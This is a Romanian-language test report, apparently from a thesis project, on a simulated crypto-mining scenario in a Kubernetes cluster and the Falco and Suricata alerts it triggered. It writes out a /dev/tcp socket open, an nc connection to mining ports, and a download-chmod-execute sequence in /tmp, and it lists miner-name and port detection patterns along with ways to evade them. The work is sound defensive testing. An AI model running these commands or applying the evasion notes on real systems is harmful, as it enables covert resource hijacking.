# Scenariul 2 — Crypto Mining / Resource Hijacking

**MITRE ATT&CK:** T1496 (Resource Hijacking), T1105 (Ingress Tool Transfer)

> **Notă etică / de design:** NU rulăm un miner real (consum de resurse, descărcare de malware). Folosim binare benigne (`/bin/sleep`, `/bin/true`) **redenumite** ca `xmrig`/`cpuminer`/`minerd` pentru a declanșa regula bazată pe `proc.name`, plus conexiuni la porturi tipice de mining pool (`connect()` se loghează indiferent dacă listenerul există). Demonstrează detecția fără a executa efectiv minerit.

## Pași de atac

1. **"Descarcă" un miner + chmod +x** — `curl -o /tmp/xmrig http://example.com/` (conținut benign), apoi `cp /bin/sleep /tmp/xmrig && chmod +x /tmp/xmrig`. [T1105]
2. **Execută minerul `xmrig`** — `/tmp/xmrig 3` (de fapt `sleep 3`); `proc.name=xmrig` (comm-ul setat din basename-ul executabilului). [T1496]
3. **Conexiune la port mining pool 3333** — `bash -c 'exec 3<>/dev/tcp/1.1.1.1/3333'` (pool checkin). [T1496]
4. **Conexiune la port mining pool 5555 via netcat** — `nc -w 2 1.1.1.1 5555`. [T1496]
5. **A doua/treia variantă de miner** — `cp /bin/true /tmp/cpuminer && chmod +x && /tmp/cpuminer`; `cp /bin/sleep /tmp/minerd && chmod +x && /tmp/minerd 2`. [T1496]
6. Cleanup binare (`rm /tmp/xmrig /tmp/cpuminer /tmp/minerd`).

## Reguli relevante

| Regulă | Tip | Priority | Match pe |
|---|---|---|---|
| `K8S_THREAT: Crypto Mining Binary Detected` | custom | Critical | `proc.name in (xmrig, xmr-stak, minerd, minergate, cpuminer, ethminer, cgminer, bfgminer, t-rex, phoenixminer, nbminer, lolminer, gminer)` — pașii 2, 5 |
| `K8S_THREAT: Crypto Mining Pool Connection` | custom | Warning | `connect`/`sendto` TCP cu `fd.rport in crypto_mining_ports` (3333, 5555, 7777, 8888, 9999, 14433, 14444, 45700 — 4444 scos la rev 24) — pașii 3, 4 |
| `K8S_THREAT: Binary Downloaded and Executed` | custom | Critical | `chmod +x /tmp/...` — pașii 1, 5 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool` | custom | Warning | overlap pe `curl` (pasul 1) și `nc` (pasul 4) |
| `K8S_THREAT: Network Scanning Tool` | custom | Warning | overlap pe `nc` (pasul 4) |
| `Drop and execute new binary in container` | default | Critical | `/tmp/xmrig`, `/tmp/minerd` etc. (ctime fresh, dropate post-startup) + `curl` |

## Rezultate finale (helm rev 25)

### Falco — 17 detecții (0 fals-pozitive curate; 2 atribuiri greșite benigne — vezi mai jos)

| Regulă | Tip | Priority | Count | Generată de |
|---|---|---|---|---|
| `Drop and execute new binary in container` | default | Critical | 5 | `curl`, `/tmp/xmrig`, `nc`, `/tmp/cpuminer`, `/tmp/minerd` (toate post-startup, ctime fresh) |
| `K8S_THREAT: Binary Downloaded and Executed` | custom | Critical | 3 | `chmod +x /tmp/xmrig`, `chmod +x /tmp/cpuminer`, `chmod +x /tmp/minerd` |
| `K8S_THREAT: Crypto Mining Binary Detected` | custom | Critical | 3 | `xmrig`, `cpuminer`, `minerd` (proc.name match) — pașii 2, 5 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | 2 | `curl` (pasul 1), `nc` (pasul 4) — overlap s07 |
| `K8S_THREAT: Reverse Shell - Command Pattern in Container` | custom | Critical | 2 | ⚠️ atribuire greșită — `bash -c 'exec 3<>/dev/tcp/1.1.1.1/3333 ...'` (pasul 3) match-uiește pattern-ul `/dev/tcp` al regulii de reverse shell |
| `K8S_THREAT: Crypto Mining Pool Connection` | custom | Warning | 1 | `nc -w 2 1.1.1.1 5555` (pasul 4) — `fd.rport=5555` ∈ `crypto_mining_ports` |
| `K8S_THREAT: Network Scanning Tool in Container` | custom | Warning | 1 | `nc` (pasul 4) — overlap s05 |
| **Total Falco** | | | **17** | |

### Bilanț detecție

| Step | Detectat? | Prin ce |
|---|---|---|
| 1 — curl download + chmod +x miner | ✅ DA | Data Exfil Transfer Tool + Binary Downloaded and Executed + Drop&Execute |
| 2 — exec `/tmp/xmrig` | ✅ DA | **Crypto Mining Binary Detected** + Drop&Execute |
| 3 — `/dev/tcp/.../3333` (pool checkin) | ✅ DA (atribuit greșit) | `Reverse Shell - Command Pattern` ×2 — alerta e corectă (bash deschide socket TCP raw dintr-un container = suspect), dar categorisirea ("reverse shell") nu se potrivește cu intenția (pool checkin) |
| 4 — `nc ... :5555` (pool checkin) | ✅ DA | **Crypto Mining Pool Connection** + Network Scanning + Data Exfil + Drop&Execute |
| 5 — exec `/tmp/cpuminer` + `/tmp/minerd` | ✅ DA | **Crypto Mining Binary Detected** ×2 + Binary Downloaded and Executed ×2 + Drop&Execute ×2 |

**Detection rate**: 5/5 = 100%. **False positive rate**: 0 FP curate. **0 iterații de tuning necesare** (lista `crypto_mining_ports` fusese deja curățată la rev 24 — vezi s03).

### Suricata
4 alerte, toate zgomot STREAM (anomalii TCP de transport) — niciuna pe traficul "de mining". Așteptat: nu generăm trafic Stratum real (motive etice, vezi nota de sus). În producție, mining-ul real ar declanșa signature-uri ET pe protocolul Stratum / "Cryptocurrency Miner Checkin" → detecție cross-layer reală.

## Atribuirea greșită `/dev/tcp` → Reverse Shell (relevant pentru Cap D)

Pasul 3 (`bash -c 'exec 3<>/dev/tcp/1.1.1.1/3333'`) declanșează `K8S_THREAT: Reverse Shell - Command Pattern` pentru că regula verifică `proc.cmdline contains "/dev/tcp"`. Tehnic, un miner care face pool-checkin printr-un socket bash `/dev/tcp` NU e un reverse shell — dar **alerta rămâne corectă la nivel de comportament**: un proces `bash` care deschide un socket TCP raw dintr-un container e anomal indiferent de scop. Aceasta e o **limitare inerentă a regulilor pattern-based pe cmdline**: ele detectează *forma* (folosirea `/dev/tcp`), nu *intenția*. Două opțiuni de design, ambele valide:
1. **Accepți over-matching-ul** — alerta tot e acționabilă; un analist o investighează și constată că e pool-checkin, nu shell. (Ales aici.)
2. **Reguli mai specifice** — ai dezambigua adăugând context (ex: dacă procesul ulterior se conectează la un port de mining → reclasifică drept crypto; dacă STDIN/STDOUT sunt redirectate către socket → reverse shell). Complex, fragil.

**Notă**: nu confundați cu fixul de la s03 (scoaterea portului 4444 din `crypto_mining_ports`) — acolo era atribuirea greșită inversă (reverse shell pe :4444 → crypto mining), rezolvată prin curățarea listei. Aici e `/dev/tcp` → reverse shell, lăsat ca over-match acceptat.

## Procesul de tuning

| Iterație | Modificare | Total | True+ | False+ |
|---|---|---|---|---|
| A (baseline, helm rev 25) | reguli existente (`crypto_mining_ports` deja curățată la rev 24) | 17 | 17 (15 categorisite corect + 2 atribuiri greșite benigne) | 0 |

**0 iterații de tuning necesare.** Singura ajustare relevantă (scoaterea 4444 din `crypto_mining_ports`) fusese deja făcută la rev 24 în urma testării s03.

## Observații așteptate (de validat)

1. **Detecție pe nume de binar — robustă pentru miner-e cunoscute, ușor de evitat** — regula `Crypto Mining Binary Detected` se bazează pe `proc.name in (lista de mineri cunoscuți)`. Prinde imediat un `xmrig` redenumit chiar dacă e de fapt alt binar (TP în contextul nostru de test — dovedește că regula funcționează). Dar un atacator care redenumește `xmrig` ca `nginx` sau `[kworker/0:1]` ar evita complet — vezi false negatives. Complementată de `Drop and execute new binary` (comportamentală: binar nou post-startup) și de `Crypto Mining Pool Connection` (rețea).

2. **Detecție pe port — euristică, după curățarea listei** — `crypto_mining_ports` a fost curățată la rev 24 (scos 4444, care cauza atribuire greșită la reverse shell-urile, vezi s03). Porturile rămase (3333/5555/7777/14444/45700) sunt specifice pool-urilor Stratum. `connect()` la unul din ele dintr-un container = semnal puternic. Funcționează chiar dacă conexiunea eșuează (nimeni nu ascultă) — syscall-ul `connect` se loghează cu `fd.rport` setat.

3. **Cross-tool: Suricata ar prinde Stratum, dar nu ne conectăm la un pool real** — Suricata are signature-uri ET pentru protocolul Stratum / "Cryptocurrency Miner Checkin". Dacă ne-am conecta la un pool real cu trafic Stratum (`{"method":"mining.subscribe",...}`), Suricata ar alerta. Din motive etice nu o facem; documentăm că **în producție, mining-ul real ar declanșa detecție cross-layer** (Falco: binar+conexiune; Suricata: protocol Stratum în clar pe wire).

4. **Cross-scenario overlap (din nou)** — `curl` → Data Exfil Transfer Tool (s07); `nc` → Network Scanning Tool (s05) + Data Exfil; `chmod +x /tmp` → Binary Downloaded and Executed (s08). Crypto mining-ul real combină mai multe TTP-uri (ingress tool transfer + execution + C2/pool), deci e normal să atingă reguli din mai multe scenarii.

## False negatives potențiale

- **Miner redenumit** (`xmrig` → `nginx`, `[kworker/...]`, etc.) — `Crypto Mining Binary Detected` ratează (verifică `proc.name`). Doar `Drop and execute new binary` (dacă binarul e dropat post-startup) sau detecția de pool-connection ar mai avea șansă.
- **Miner cu pool pe port non-standard** (443, 80) sau prin proxy/TLS — `Crypto Mining Pool Connection` ratează (port nu e în listă). Mining-ul prin pool-uri care folosesc 443+TLS e o tehnică de evaziune cunoscută.
- **Pool connection via DNS/domain fără port standard** — neacoperit.
- **In-browser / WASM mining** (cryptojacking în pagini web servite de un pod) — nu e un proces nativ, nu se vede la nivel de syscall în pod.
- **Miner built-in într-o imagine malițioasă** (ENTRYPOINT = miner) — `Drop and execute` ratează (nu e dropat post-startup, e în imagine); doar `Crypto Mining Binary Detected` (dacă numele e cunoscut) sau pool-connection.

## Comanda de rulare

```bash
cd /home/tionu/Proiect_licenta/k8s-threat-detection-system/attack-scenarios/02-crypto-mining
./attack.sh
```
